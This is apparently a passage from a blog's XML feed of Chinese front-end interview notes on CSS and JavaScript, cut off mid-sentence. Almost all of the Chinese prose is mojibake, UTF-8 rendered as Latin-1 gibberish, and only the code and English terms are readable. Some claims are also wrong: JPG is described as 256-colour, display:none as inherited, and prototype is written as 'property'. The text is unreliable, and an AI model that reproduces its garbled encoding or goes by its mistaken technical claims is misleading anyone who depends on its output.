ä¸­æ–‡ç•Œé¢ä¸‹é»˜è®¤ä¼šå°†å°äºŽ 12px çš„æ–‡æœ¬å¼ºåˆ¶æŒ‰ç…§ 12px æ˜¾ç¤ºï¼Ÿcss å±žæ€§ï¼š-webkit-text-size-adjust: none; ä¸ºä»€ä¹ˆè¦åˆå§‹åŒ– CSS æ ·å¼ï¼Ÿå› ä¸ºæµè§ˆå™¨çš„å…¼å®¹é—®é¢˜ï¼Œä¸åŒæµè§ˆå™¨å¯¹æœ‰äº›æ ‡ç­¾çš„é»˜è®¤å€¼æ˜¯ä¸åŒçš„ï¼Œå¦‚æžœæ²¡å¯¹ CSS åˆå§‹åŒ–å¾€å¾€ä¼šå‡ºçŽ°æµè§ˆå™¨ä¹‹é—´çš„é¡µé¢æ˜¾ç¤ºå·®å¼‚ã€‚å½“ç„¶ï¼Œåˆå§‹åŒ–æ ·å¼ä¼šå¯¹ SEO æœ‰ä¸€å®šçš„å½±å“ï¼Œä½†é±¼å’Œç†ŠæŽŒä¸å¯å…¼å¾—ï¼Œä½†åŠ›æ±‚å½±å“æœ€å°çš„æƒ…å†µä¸‹åˆå§‹åŒ–ã€‚ æ·˜å®åˆå§‹æ ·å¼ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192body,h1,h2,h3,h4,h5,h6,hr,p,blockquote,dl,dt,dd,ul,ol,li,pre,form,fieldset,legend,button,input,textarea,th,td &#123; margin: 0; padding: 0;&#125;body,button,input,select,textarea &#123; font: 12px/1.5tahoma, arial, \5b8b\4f53;&#125;h1,h2,h3,h4,h5,h6 &#123; font-size: 100%;&#125;address,cite,dfn,em,var &#123; font-style: normal;&#125;code,kbd,pre,samp &#123; font-family: couriernew, courier, monospace;&#125;small &#123; font-size: 12px;&#125;ul,ol &#123; list-style: none;&#125;a &#123; text-decoration: none;&#125;a:hover &#123; text-decoration: underline;&#125;sup &#123; vertical-align: text-top;&#125;sub &#123; vertical-align: text-bottom;&#125;legend &#123; color: #000;&#125;fieldset,img &#123; border: 0;&#125;button,input,select,textarea &#123; font-size: 100%;&#125;table &#123; border-collapse: collapse; border-spacing: 0;&#125; position è·Ÿ displayã€margin collapseã€overflowã€float è¿™äº›ç‰¹æ€§ç›¸äº’å åŠ åŽä¼šæ€Žä¹ˆæ ·ï¼Ÿ å¦‚æžœå…ƒç´ çš„ display ä¸º noneï¼Œé‚£ä¹ˆå…ƒç´ ä¸è¢«æ¸²æŸ“ï¼Œposition å’Œ float ä¸èµ·ä½œç”¨ å¦‚æžœå…ƒç´ æ‹¥æœ‰position:absolute;æˆ–è€…position:fixed;å±žæ€§é‚£ä¹ˆå…ƒç´ å°†ä¸ºç»å¯¹å®šä½ï¼Œfloat ä¸èµ·ä½œç”¨ å¦‚æžœå…ƒç´  float å±žæ€§ä¸æ˜¯ none,å…ƒç´ ä¼šè„±ç¦»æ–‡æ¡£æµï¼Œæ ¹æ® float å±žæ€§å€¼æ¥æ˜¾ç¤º æœ‰æµ®åŠ¨ã€ç»å¯¹å®šä½ã€inline-block å±žæ€§çš„å…ƒç´ ï¼Œmargin ä¸ä¼šå’Œåž‚ç›´æ–¹å‘ä¸Šçš„å…¶ä»–å…ƒç´  margin æŠ˜å  css å®šä¹‰æƒé‡ä»¥ä¸‹æ˜¯æƒé‡çš„è§„åˆ™ï¼šæ ‡ç­¾çš„æƒé‡ä¸º 1ï¼Œclass çš„æƒé‡ä¸º 10ï¼Œid çš„æƒé‡ä¸º 100 zoom:1 çš„æ¸…é™¤æµ®åŠ¨åŽŸç†ï¼Ÿ æ¸…é™¤æµ®åŠ¨ï¼Œè§¦å‘ hasLayoutï¼› Zoom å±žæ€§æ˜¯ IE æµè§ˆå™¨çš„ä¸“æœ‰å±žæ€§ï¼Œå®ƒå¯ä»¥è®¾ç½®æˆ–æ£€ç´¢å¯¹è±¡çš„ç¼©æ”¾æ¯”ä¾‹ã€‚è§£å†³ ie ä¸‹æ¯”è¾ƒå¥‡è‘©çš„ bugã€‚ ç§»åŠ¨ç«¯å¸ƒå±€æœ‰å“ªå‡ ç§æ–¹æ³•ï¼Ÿå¾…å†™â€¦ CSS ä¼˜åŒ–ã€æé«˜æ€§èƒ½çš„æ–¹æ³•æœ‰å“ªäº›ï¼Ÿ å…³é”®é€‰æ‹©å™¨ï¼ˆkey selectorï¼‰ã€‚é€‰æ‹©å™¨çš„æœ€åŽé¢çš„éƒ¨åˆ†ä¸ºå…³é”®é€‰æ‹©å™¨ï¼ˆå³ç”¨æ¥åŒ¹é…ç›®æ ‡å…ƒç´ çš„éƒ¨åˆ†ï¼‰ï¼› å¦‚æžœè§„åˆ™æ‹¥æœ‰ ID é€‰æ‹©å™¨ä½œä¸ºå…¶å…³é”®é€‰æ‹©å™¨ï¼Œåˆ™ä¸è¦ä¸ºè§„åˆ™å¢žåŠ æ ‡ç­¾ã€‚è¿‡æ»¤æŽ‰æ— å…³çš„è§„åˆ™ï¼ˆè¿™æ ·æ ·å¼ç³»ç»Ÿå°±ä¸ä¼šæµªè´¹æ—¶é—´åŽ»åŒ¹é…å®ƒä»¬äº†ï¼‰ï¼› æå–é¡¹ç›®çš„é€šç”¨å…¬æœ‰æ ·å¼ï¼Œå¢žå¼ºå¯å¤ç”¨æ€§ï¼ŒæŒ‰æ¨¡å—ç¼–å†™ç»„ä»¶ï¼›å¢žå¼ºé¡¹ç›®çš„ååŒå¼€å‘æ€§ã€å¯ç»´æŠ¤æ€§å’Œå¯æ‰©å±•æ€§; ä½¿ç”¨é¢„å¤„ç†å·¥å…·æˆ–æž„å»ºå·¥å…·ï¼ˆgulp å¯¹ css è¿›è¡Œè¯­æ³•æ£€æŸ¥ã€è‡ªåŠ¨è¡¥å‰ç¼€ã€æ‰“åŒ…åŽ‹ç¼©ã€è‡ªåŠ¨ä¼˜é›…é™çº§ï¼‰ï¼› margin å’Œ padding åˆ†åˆ«é€‚åˆä»€ä¹ˆåœºæ™¯ä½¿ç”¨ï¼Ÿmargin æ˜¯ç”¨æ¥éš”å¼€å…ƒç´ ä¸Žå…ƒç´ çš„é—´è·ï¼›padding æ˜¯ç”¨æ¥éš”å¼€å…ƒç´ ä¸Žå†…å®¹çš„é—´éš”ã€‚ ::before å’Œ :beforeä¸­åŒå†’å·å’Œå•å†’å· æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿè§£é‡Šä¸€ä¸‹è¿™ 2 ä¸ªä¼ªå…ƒç´ çš„ä½œç”¨ã€‚:è¡¨ç¤ºä¼ªç±»ï¼Œ::è¡¨ç¤ºä¼ªå…ƒç´  w3c å®šä¹‰ï¼š CSS ä¼ªç±»ç”¨äºŽå‘æŸäº›é€‰æ‹©å™¨æ·»åŠ ç‰¹æ®Šçš„æ•ˆæžœ css ä¼ªå…ƒç´ ç”¨äºŽå°†ç‰¹æ®Šçš„æ•ˆæžœæ·»åŠ åˆ°æŸäº›é€‰æ‹©å™¨ ä¼ªç±»åé€‰æ‹©ï¼Œä¼ªå…ƒç´ åå…ƒç´  ä¼ªç±»æœ‰ï¼š:active, :focus, :hover, :link, :visited, :first-child, :lang ä¼ªå…ƒç´ æœ‰ï¼š::first-letter, ::first-line, ::before, ::after font-style å±žæ€§å¯ä»¥è®©å®ƒèµ‹å€¼ä¸ºâ€œobliqueâ€ oblique æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿè®©æ²¡æœ‰å€¾æ–œçš„å­—ä½“å€¾æ–œ è®©é¡µé¢é‡Œçš„å­—ä½“å˜æ¸…æ™°ï¼Œå˜ç»†ç”¨ CSS æ€Žä¹ˆåšï¼Ÿ-webkit-font-smoothing: antialiased; å¦‚æžœéœ€è¦æ‰‹åŠ¨å†™åŠ¨ç”»ï¼Œä½ è®¤ä¸ºæœ€å°æ—¶é—´é—´éš”æ˜¯å¤šä¹…ï¼Œä¸ºä»€ä¹ˆï¼Ÿï¼ˆé˜¿é‡Œï¼‰å¤šæ•°æ˜¾ç¤ºå™¨é»˜è®¤é¢‘çŽ‡æ˜¯ 60Hzï¼Œå³ 1 ç§’åˆ·æ–° 60 æ¬¡ï¼Œæ‰€ä»¥ç†è®ºä¸Šæœ€å°é—´éš”ä¸º1/60*1000ms =16.7ms display:inline-block ä»€ä¹ˆæ—¶å€™ä¼šæ˜¾ç¤ºé—´éš™ï¼Ÿ(æºç¨‹)ç§»é™¤ç©ºæ ¼ã€ä½¿ç”¨marginè´Ÿå€¼ã€ä½¿ç”¨font-size:0ã€letter-spacingã€word-spacing ä»€ä¹ˆæ˜¯ Cookie éš”ç¦»ï¼Ÿï¼ˆæˆ–è€…è¯´ï¼šè¯·æ±‚èµ„æºçš„æ—¶å€™ä¸è¦è®©å®ƒå¸¦ cookie æ€Žä¹ˆåšï¼‰å¦‚æžœé™æ€æ–‡ä»¶éƒ½æ”¾åœ¨ä¸»åŸŸåä¸‹ï¼Œé‚£é™æ€æ–‡ä»¶è¯·æ±‚çš„æ—¶å€™éƒ½å¸¦æœ‰çš„ cookie çš„æ•°æ®æäº¤ç»™ server çš„ï¼Œéžå¸¸æµªè´¹æµé‡ï¼Œæ‰€ä»¥ä¸å¦‚éš”ç¦»å¼€ã€‚ å› ä¸º cookie æœ‰åŸŸçš„é™åˆ¶ï¼Œå› æ­¤ä¸èƒ½è·¨åŸŸæäº¤è¯·æ±‚ï¼Œæ•…ä½¿ç”¨éžä¸»è¦åŸŸåçš„æ—¶å€™ï¼Œè¯·æ±‚å¤´ä¸­å°±ä¸ä¼šå¸¦æœ‰ cookie æ•°æ®ï¼Œè¿™æ ·å¯ä»¥é™ä½Žè¯·æ±‚å¤´çš„å¤§å°ï¼Œé™ä½Žè¯·æ±‚æ—¶é—´ï¼Œä»Žè€Œè¾¾åˆ°é™ä½Žæ•´ä½“è¯·æ±‚å»¶æ—¶çš„ç›®çš„ã€‚ style æ ‡ç­¾å†™åœ¨ body åŽä¸Ž body å‰æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿæ ‡å‡†ä¸€ç›´æ˜¯è§„å®š style å…ƒç´ ä¸åº”å‡ºçŽ°åœ¨ body å…ƒç´ ä¸­ï¼Œä¸è¿‡ç½‘é¡µæµè§ˆå™¨ä¸€ç›´æœ‰å®¹é”™è®¾è®¡ã€‚å¦‚æžœ style å…ƒç´ å‡ºçŽ°åœ¨ body å…ƒç´ ï¼Œæœ€ç»ˆæ•ˆæžœå’Œ style å…ƒç´ å‡ºçŽ°åœ¨ head é‡Œæ˜¯ä¸€æ ·çš„ã€‚ä½†æ˜¯å¯èƒ½å¼•èµ· FOUCã€é‡ç»˜æˆ–é‡æ–°å¸ƒå±€ã€‚ ä»€ä¹ˆæ˜¯ CSS é¢„å¤„ç†å™¨ / åŽå¤„ç†å™¨ï¼Ÿ é¢„å¤„ç†å™¨ä¾‹å¦‚ï¼šLESSã€Sassã€Stylusï¼Œç”¨æ¥é¢„ç¼–è¯‘ Sass æˆ– lessï¼Œå¢žå¼ºäº† css ä»£ç çš„å¤ç”¨æ€§ï¼Œè¿˜æœ‰å±‚çº§ã€mixinã€å˜é‡ã€å¾ªçŽ¯ã€å‡½æ•°ç­‰ï¼Œå…·æœ‰å¾ˆæ–¹ä¾¿çš„ UI ç»„ä»¶æ¨¡å—åŒ–å¼€å‘èƒ½åŠ›ï¼Œæžå¤§çš„æé«˜å·¥ä½œæ•ˆçŽ‡ã€‚ åŽå¤„ç†å™¨ä¾‹å¦‚ï¼šPostCSSï¼Œé€šå¸¸è¢«è§†ä¸ºåœ¨å®Œæˆçš„æ ·å¼è¡¨ä¸­æ ¹æ® CSS è§„èŒƒå¤„ç† CSSï¼Œè®©å…¶æ›´æœ‰æ•ˆï¼›ç›®å‰æœ€å¸¸åšçš„æ˜¯ç»™ CSS å±žæ€§æ·»åŠ æµè§ˆå™¨ç§æœ‰å‰ç¼€ï¼Œå®žçŽ°è·¨æµè§ˆå™¨å…¼å®¹æ€§çš„é—®é¢˜ã€‚ display: none;å’Œvisibility: hidden;çš„åŒºåˆ«ï¼Ÿå…±åŒç‚¹ï¼š éƒ½è®©å…ƒç´ ä¸å¯è§ åŒºåˆ«ï¼š display: none;ä¼šè®©å…ƒç´ å®Œå…¨ä»Žæ¸²æŸ“æ ‘ä¸­æ¶ˆå¤±ï¼Œæ¸²æŸ“çš„æ—¶å€™ä¸å æ®ä»»ä½•ç©ºé—´ï¼›visibility: hidden;ä¸ä¼šè®©å…ƒç´ ä»Žæ¸²æŸ“æ ‘æ¶ˆå¤±ï¼Œå…ƒç´ ä»å æ®ç©ºé—´ï¼Œåªæ˜¯å†…å®¹ä¸å¯è§ã€‚ display: none;æ˜¯ç»§æ‰¿å±žæ€§ï¼Œå­å­™èŠ‚ç‚¹æ¶ˆå¤±ç”±äºŽå…ƒç´ ä»Žæ¸²æŸ“æ ‘æ¶ˆå¤±é€ æˆï¼Œé€šè¿‡ä¿®æ”¹å­å­™èŠ‚ç‚¹å±žæ€§æ— æ³•æ˜¾ç¤ºï¼›visibility: hidden;æ˜¯ç»§æ‰¿å±žæ€§ï¼Œå­å­™èŠ‚ç‚¹æ¶ˆå¤±ç”±äºŽç»§æ‰¿äº†è¯¥å±žæ€§ï¼Œé€šè¿‡è®¾ç½®visibility: visible;å¯ä»¥è®©å…¶æ˜¾ç¤ºã€‚ ä¿®æ”¹å¸¸è§„æµä¸­å…ƒç´ çš„displayé€šå¸¸ä¼šé€ æˆæ–‡æ¡£é‡æŽ’ã€‚ä¿®æ”¹visibilityåªä¼šé€ æˆå…ƒç´ çš„é‡ç»˜ã€‚ è¯»å±å™¨ä¸ä¼šè¯»å–display: none;å…ƒç´ å†…å®¹ï¼Œä½†ä¼šè¯»å–visibility: hidden;å…ƒç´ å†…å®¹ã€‚ linkå’Œ@importçš„åŒºåˆ«ï¼Ÿ linkæ˜¯ HTML æ–¹å¼ï¼Œ@importæ˜¯ css æ–¹å¼ã€‚ linkæœ€å¤§é™åº¦æ”¯æŒå¹¶è¡Œä¸‹è½½ï¼Œ@importè¿‡å¤šåµŒå¥—å¯¼è‡´ä¸²è¡Œä¸‹è½½ï¼Œå‡ºçŽ° FOUCã€‚ linkå¯ä»¥é€šè¿‡rel=&quot;alternate stylesheet&quot;æŒ‡å®šå€™é€‰æ ·å¼ã€‚ æµè§ˆå™¨å¯¹linkæ”¯æŒæ—©äºŽ@importï¼Œå¯ä»¥ä½¿ç”¨@importå¯¹è€æµè§ˆå™¨éšè—æ ·å¼ã€‚ @importå¿…é¡»å†æ ·å¼è§„åˆ™ä¹‹å‰ï¼Œå¯ä»¥å† css æ–‡ä»¶ä¸­å¼•ç”¨å…¶ä»–æ–‡ä»¶ã€‚ æ€»ä½“æ¥è¯´ï¼šlinkä¼˜äºŽ@importã€‚ ä»€ä¹ˆæ˜¯ FOUCï¼Ÿå¦‚ä½•é¿å…ï¼Ÿ Flash Of Unstyled Contentï¼Œç”¨æˆ·å®šä¹‰æ ·å¼è¡¨åŠ è½½ä¹‹å‰æµè§ˆå™¨ä½¿ç”¨é»˜è®¤æ ·å¼æ˜¾ç¤ºæ–‡æ¡£ï¼Œç”¨æˆ·æ ·å¼åŠ è½½æ¸²æŸ“ä¹‹åŽå†é‡æ–°æ˜¾ç¤ºæ–‡æ¡£ï¼Œé€ æˆé¡µé¢é—ªçƒã€‚ è§£å†³æ–¹æ³•ï¼šæŠŠæ ·å¼è¡¨æ”¾åˆ°æ–‡æ¡£çš„&lt;head&gt;ã€‚ æ¸…é™¤æµ®åŠ¨æœ‰å“ªå‡ ç§æ–¹å¼ï¼Ÿ çˆ¶çº§å…ƒç´ è®¾ç½®å±žæ€§height ç»“å°¾å¤„åŠ ä¸€ä¸ªå—çº§ç©ºå…ƒç´ å¹¶clear: both; çˆ¶çº§å®šä¹‰ä¼ªå…ƒç´ ::afterå¹¶ä¸”å±žæ€§ä¸ºzoom: 1; clear: both; çˆ¶çº§å…ƒç´ è®¾ç½®å±žæ€§overflowä¸ä¸ºvisible çˆ¶çº§ä¹Ÿæµ®åŠ¨ï¼ŒåŒæ—¶è®¾ç½®å®½åº¦ PNGï¼ŒGIFï¼ŒJPG çš„åŒºåˆ«åŠå¦‚ä½•é€‰æ‹©ï¼Ÿ PNG æœ‰ PNG8 å’Œ truecolor PNG PNG8 æ˜¯ 256 è‰² æ–‡ä»¶å°ï¼Œæ”¯æŒalphaé€æ˜Žåº¦ï¼Œæ— åŠ¨ç”» é€‚åˆèƒŒæ™¯å›¾ï¼Œå›¾æ ‡ï¼ŒæŒ‰é’® GIF 8 ä½åƒç´ ï¼Œ256 è‰² æ— æŸåŽ‹ç¼© æ”¯æŒåŠ¨ç”» æ”¯æŒbooleané€æ˜Ž é€‚åˆç®€å•åŠ¨ç”» JPG 256 è‰² æœ‰æŸåŽ‹ç¼© ä¸æ”¯æŒé€æ˜Ž é€‚åˆç…§ç‰‡ æµè§ˆå™¨æ¸²æŸ“æœºåˆ¶æ˜¯ä»€ä¹ˆ æµè§ˆå™¨æ¸²æŸ“é¡µé¢æ•´ä¸ªè¿‡ç¨‹ï¼š é¦–å…ˆï¼Œè§£æž HTML Sourceï¼Œæž„å»º DOM Treeï¼› åŒæ—¶ï¼Œè§£æž CSS Styleï¼Œæž„å»º CSSOM Treeï¼› ç„¶åŽï¼Œç»„åˆ DOM Tree ä¸Ž CSSOM Treeï¼ŒåŽ»é™¤ä¸å¯è§å…ƒç´ ï¼Œæž„å»º Render Treeï¼› å†æ‰§è¡Œ Reflowï¼Œæ ¹æ® Render Tree è®¡ç®—æ¯ä¸ªå¯è§å…ƒç´ çš„å¸ƒå±€ï¼› æœ€åŽï¼Œæ‰§è¡Œ Repaintï¼Œé€šè¿‡ç»˜åˆ¶æµç¨‹ï¼Œå°†æ¯ä¸ªåƒç´ æ¸²æŸ“åˆ°å±å¹•ä¸Šï¼› æ³¨æ„ï¼š Render Tree åªåŒ…å«æ¸²æŸ“ç½‘é¡µæ‰€éœ€è¦çš„èŠ‚ç‚¹ï¼› Reflow è¿‡ç¨‹æ˜¯å¸ƒå±€è®¡ç®—æ¯ä¸ªå¯¹è±¡çš„ç²¾ç¡®ä½ç½®å’Œå¤§å°ï¼› Repaint è¿‡ç¨‹åˆ™æ˜¯å°† Render Tree çš„æ¯ä¸ªåƒç´ æ¸²æŸ“åˆ°å±å¹•ä¸Šï¼› é‡æŽ’ï¼ˆreflowï¼‰å’Œé‡ç»˜ï¼ˆrepaintï¼‰ é‡æŽ’ï¼ˆåˆç§°å›žæµï¼‰ï¼Œå‘ç”Ÿåœ¨ Render Tree é˜¶æ®µï¼Œå®ƒä¸»è¦ç”¨æ¥ç¡®å®šå…ƒç´ çš„å‡ ä½•å±žæ€§å’Œä½ç½® é‡ç»˜ï¼Œå‘ç”Ÿåœ¨é‡æŽ’ï¼ˆreflowï¼‰è¿‡ç¨‹ä¹‹åŽï¼Œå°†å…ƒç´ çš„é¢œè‰²ã€èƒŒæ™¯å±žæ€§ç»˜åˆ¶å‡ºæ¥ æ€Žæ ·è§¦å‘ reflow å’Œ repaintè§¦å‘ Reflow å¢žåŠ ã€åˆ é™¤å’Œä¿®æ”¹ DOM èŠ‚ç‚¹æ—¶ï¼Œä¼šå¯¼è‡´ Reflow æˆ– Repaint ç§»åŠ¨ DOM ä½ç½®ï¼Œæˆ–è€…åŠ¨ç”» ä¿®æ”¹ä½ç½®æ ·å¼ Resize çª—å£ï¼Œæˆ–è€…æ˜¯æ»šåŠ¨ ä¿®æ”¹ç½‘é¡µé»˜è®¤å­—ä½“ è§¦å‘ Repaint å¢žåŠ ã€åˆ é™¤å’Œä¿®æ”¹ DOM èŠ‚ç‚¹ css æ”¹åŠ¨ å¦‚ä½•å‡å°‘ reflow å’Œ Repaint è¿‡ç¨‹ å‡å°‘ js é€ä¸ªä¿®æ”¹æ ·å¼ï¼Œè€Œæ˜¯ç”¨æ·»åŠ ã€ä¿®æ”¹ css ç±» é€šè¿‡documentFragmenté›†ä¸­å¤„ç†ä¸´æ—¶æ“ä½œ å…‹éš†èŠ‚ç‚¹è¿›è¡Œæ“ä½œï¼Œç„¶åŽè¿›è¡ŒåŽŸèŠ‚ç‚¹æ›¿æ¢ ä½¿ç”¨display: none;è¿›è¡Œæ‰¹é‡æ“ä½œ å‡å°‘æ ·å¼é‡æ–°è®¡ç®—ï¼Œå³å‡å°‘offsetã€scrollã€clientX/Yã€getComputedStyleã€currentStyleçš„ä½¿ç”¨ï¼Œå› ä¸ºæ¯æ¬¡ä½¿ç”¨éƒ½ä¼šåˆ·æ–°æ“ä½œç¼“å†²åŒºï¼Œæ‰§è¡Œ reflow å’Œ repaint è§£å†³ç§»åŠ¨ç«¯ 1px é—®é¢˜ é¦–å…ˆç§»åŠ¨ç«¯ 1px é—®é¢˜çš„èƒŒæ™¯æ˜¯å› ä¸ºåœ¨ç§»åŠ¨ç«¯è®¾å¤‡å­˜åœ¨é«˜æ¸… Retina å±ï¼Œä¹Ÿå°±æ˜¯ 2 å€ 3 å€å±å¹•ï¼Œå®ƒä»¬çš„ dprï¼ˆç‰©ç†åƒç´ æ¯”ï¼‰æ›´é«˜ï¼Œæ¯”å¦‚ 1 x 1 px åœ¨ 2 å€å±å¹•ä¸Šä¼šç”¨ 2x2 ç‰©ç†åƒç´ æ˜¾ç¤ºï¼Œæ¯”æ™®é€šè®¾å¤‡çœ‹èµ·æ¥æ›´ç²—ã€‚è¦è§£å†³ 1px é—®é¢˜ï¼Œæœ¬è´¨å°±æ˜¯è§£å†³è®©é«˜æ¸…å±ç”¨ä¸€ä¸ªç‰©ç†åƒç´ å±•ç¤ºä¸€ä¸ª CSS åƒç´ ã€‚ æ–¹æ¡ˆä¸€ï¼šborder-image: url(svg);ä½¿ç”¨ svg åšè¾¹æ¡†å›¾ç‰‡ï¼Œsvg å¯ä»¥æ˜¯ 4x4px å›¾ç‰‡ï¼Œstroke=1ï¼Œborder-image-slice: xxxå°† svg å›¾ç‰‡åˆ‡å‰²æˆ 9 éƒ¨åˆ†ï¼Œé™¤ä¸­é—´ä¸€å—ï¼Œå…¶ä»–å…«å—å½“åšè¾¹æ¡†ä½¿ç”¨ã€‚ æ–¹æ¡ˆäºŒï¼šåˆ©ç”¨ä¼ªå…ƒç´ ï¼Œæ¯”å¦‚::afterï¼Œè®¾ç½®å…ƒç´ ç»å¯¹å®šä½ï¼Œleft`top å‡ä¸º 0ï¼Œä½¿ç”¨åª’ä½“æŸ¥è¯¢è¯†åˆ« dprï¼ˆ@media(device-pixel-radio:2)ï¼‰ï¼Œæ¯”å¦‚ dpr ä¸º 2ï¼Œå°†width: 200%; height: 200%ï¼Œç„¶åŽå†é€šè¿‡transform: scale(0.5)ï¼Œpointer-events: none;`é¼ æ ‡ç‚¹å‡»ç©¿é€ã€‚ æ–¹æ¡ˆä¸‰ï¼šviewPort + scale å‚è€ƒç§»åŠ¨ç«¯ 1px è§£å†³æ–¹æ¡ˆ]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>é¢è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯é¢è¯•ä¹‹javascript]]></title>
    <url>%2F2018%2F03%2F04%2Finter-js%2F</url>
    <content type="text"><![CDATA[ä»‹ç» js çš„åŸºæœ¬æ•°æ®ç±»åž‹Undefinedã€Nullã€Booleanã€Numberã€Stringã€ECMAScript 2015 æ–°å¢ž Symbolï¼ˆåˆ›å»ºåŽç‹¬ä¸€æ— äºŒä¸”ä¸å¯å˜çš„æ•°æ®ç±»åž‹ï¼‰ã€ES2020 æ–°å¢ž BigIntï¼ˆè¡¨ç¤ºæ•´æ•°ï¼Œæ²¡æœ‰ä½ç½®é™åˆ¶ï¼‰ã€‚ ä»‹ç» js æœ‰å“ªäº›å†…ç½®å¯¹è±¡ï¼Ÿ Object æ˜¯ JavaScript ä¸­æ‰€æœ‰å¯¹è±¡çš„çˆ¶å¯¹è±¡ æ•°æ®å°è£…ç±»å¯¹è±¡ï¼šObjectã€Arrayã€Booleanã€Number å’Œ String å…¶ä»–å¯¹è±¡ï¼šFunctionã€Argumentsã€Mathã€Dateã€RegExpã€Error è¯´å‡ æ¡å†™ JavaScript çš„åŸºæœ¬è§„èŒƒï¼Ÿ ä¸è¦åœ¨åŒä¸€è¡Œå£°æ˜Žå¤šä¸ªå˜é‡ã€‚ è¯·ä½¿ç”¨ ===/!==æ¥æ¯”è¾ƒ true/false æˆ–è€…æ•°å€¼ ä½¿ç”¨å¯¹è±¡å­—é¢é‡æ›¿ä»£ new Array è¿™ç§å½¢å¼ ä¸è¦ä½¿ç”¨å…¨å±€å‡½æ•°ã€‚ Switch è¯­å¥å¿…é¡»å¸¦æœ‰ default åˆ†æ”¯ å‡½æ•°ä¸åº”è¯¥æœ‰æ—¶å€™æœ‰è¿”å›žå€¼ï¼Œæœ‰æ—¶å€™æ²¡æœ‰è¿”å›žå€¼ã€‚ For å¾ªçŽ¯å¿…é¡»ä½¿ç”¨å¤§æ‹¬å· If è¯­å¥å¿…é¡»ä½¿ç”¨å¤§æ‹¬å· for-in å¾ªçŽ¯ä¸­çš„å˜é‡ åº”è¯¥ä½¿ç”¨ var å…³é”®å­—æ˜Žç¡®é™å®šä½œç”¨åŸŸï¼Œä»Žè€Œé¿å…ä½œç”¨åŸŸæ±¡æŸ“ã€‚ JavaScript åŽŸåž‹æ¯ä¸ªå¯¹è±¡ä¼šåœ¨å†…éƒ¨åˆå§‹åŒ–ä¸€ä¸ªå±žæ€§ï¼Œå°±æ˜¯propertyï¼Œå½“æˆ‘ä»¬è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±žæ€§æ—¶ï¼Œå¦‚æžœè¿™ä¸ªå¯¹è±¡å†…éƒ¨ä¸å­˜åœ¨è¿™ä¸ªå±žæ€§ï¼Œå°±ä¼šåŽ»propertyé‡ŒåŽ»æ‰¾è¿™ä¸ªå±žæ€§ã€‚è¿™ä¸ªpropertyåˆæœ‰è‡ªå·±çš„propertyï¼ŒäºŽæ˜¯ä¸€ç›´æ‰¾ä¸‹åŽ»ã€‚ å…³ç³»ï¼šinstance.constructor.property = instance.__proto__ JavaScript æœ‰å‡ ç§ç±»åž‹çš„å€¼ï¼Ÿä½ èƒ½ç”»ä¸€ä¸‹ä»–ä»¬çš„å†…å­˜å›¾å—ï¼Ÿæ ˆï¼šåŽŸå§‹æ•°æ®ç±»åž‹ï¼ˆUndefinedï¼ŒNullï¼ŒBooleanï¼ŒNumberã€Stringï¼‰ å †ï¼šå¼•ç”¨æ•°æ®ç±»åž‹ï¼ˆå¯¹è±¡ã€æ•°ç»„å’Œå‡½æ•°ï¼‰ ä¸¤ç§ç±»åž‹çš„åŒºåˆ«æ˜¯ï¼šå­˜å‚¨ä½ç½®ä¸åŒï¼› åŽŸå§‹æ•°æ®ç±»åž‹ç›´æŽ¥å­˜å‚¨åœ¨æ ˆ(stack)ä¸­çš„ç®€å•æ•°æ®æ®µï¼Œå æ®ç©ºé—´å°ã€å¤§å°å›ºå®šï¼Œå±žäºŽè¢«é¢‘ç¹ä½¿ç”¨æ•°æ®ï¼Œæ‰€ä»¥æ”¾å…¥æ ˆä¸­å­˜å‚¨ï¼› å¼•ç”¨æ•°æ®ç±»åž‹å­˜å‚¨åœ¨å †(heap)ä¸­çš„å¯¹è±¡,å æ®ç©ºé—´å¤§ã€å¤§å°ä¸å›ºå®šã€‚å¦‚æžœå­˜å‚¨åœ¨æ ˆä¸­ï¼Œå°†ä¼šå½±å“ç¨‹åºè¿è¡Œçš„æ€§èƒ½ï¼›å¼•ç”¨æ•°æ®ç±»åž‹åœ¨æ ˆä¸­å­˜å‚¨äº†æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘å †ä¸­è¯¥å®žä½“çš„èµ·å§‹åœ°å€ã€‚å½“è§£é‡Šå™¨å¯»æ‰¾å¼•ç”¨å€¼æ—¶ï¼Œä¼šé¦–å…ˆæ£€ç´¢å…¶åœ¨æ ˆä¸­çš„åœ°å€ï¼Œå–å¾—åœ°å€åŽä»Žå †ä¸­èŽ·å¾—å®žä½“ typeofã€instanceOfã€constructorã€Object.prototype.toStringtypeofï¼š ç›´æŽ¥åœ¨è®¡ç®—æœºåº•å±‚åŸºäºŽæ•°æ®ç±»åž‹çš„å€¼ï¼ˆäºŒè¿›åˆ¶ï¼‰æ£€æµ‹ã€‚ typeof null =&gt; Object å¯¹è±¡å­˜å‚¨åœ¨è®¡ç®—æœºä¸­ï¼Œéƒ½æ˜¯ä»¥ 000 äºŒè¿›åˆ¶å­˜å‚¨ï¼Œnull ä¹Ÿæ˜¯ï¼Œæ‰€ä»¥æ£€æµ‹å‡ºæ¥çš„ç»“æžœæ˜¯å¯¹è±¡ã€‚ typeof æ™®é€šå¯¹è±¡/æ•°ç»„å¯¹è±¡/æ­£åˆ™å¯¹è±¡/æ—¥æœŸå¯¹è±¡ =&gt; Object instanceofï¼š æ£€æµ‹å½“å‰å®žä¾‹æ˜¯å¦å±žäºŽè¿™ä¸ªç±»ã€‚ åº•å±‚æœºåˆ¶ï¼šåªè¦å½“å‰ç±»å‡ºçŽ°åœ¨å®žä¾‹çš„åŽŸåž‹ä¸Šï¼Œç»“æžœä¸º trueã€‚ ä¸èƒ½æ£€æµ‹åŸºç¡€æ•°æ®ç±»åž‹ï¼Œ1 instanceof Number =&gt; falseã€‚ åŽŸåž‹å¯ä»¥è¢«ä¿®æ”¹ï¼Œå› æ­¤æ£€æµ‹ä¼šä¸å‡†ç¡® constructorï¼š constructor å¯ä»¥è¢«ä¿®æ”¹ï¼Œå› æ­¤æ£€æµ‹ä¸å‡†ç¡® Object.prototype.toStringï¼š æ 